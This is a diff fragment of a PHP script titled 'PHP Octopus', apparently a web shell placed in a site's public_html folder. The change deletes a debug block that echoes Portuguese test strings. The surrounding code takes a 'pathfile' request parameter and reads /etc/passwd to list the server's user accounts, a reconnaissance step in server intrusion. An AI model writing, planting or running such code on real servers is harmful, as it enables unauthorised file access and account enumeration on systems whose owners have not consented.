@@ -75,12 +75,6 @@ if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
 <h1>PHP Octopus</h1>
 <?php
 
-if(file_exists('/home/principal/public_html/teste/octopus.php')){
-    echo "aaaapaaaa";
-}else{
-    echo "nao vaiiii";
-}
-
 if(@file('/etc/passwd')){
     $users = file('/etc/passwd');
 
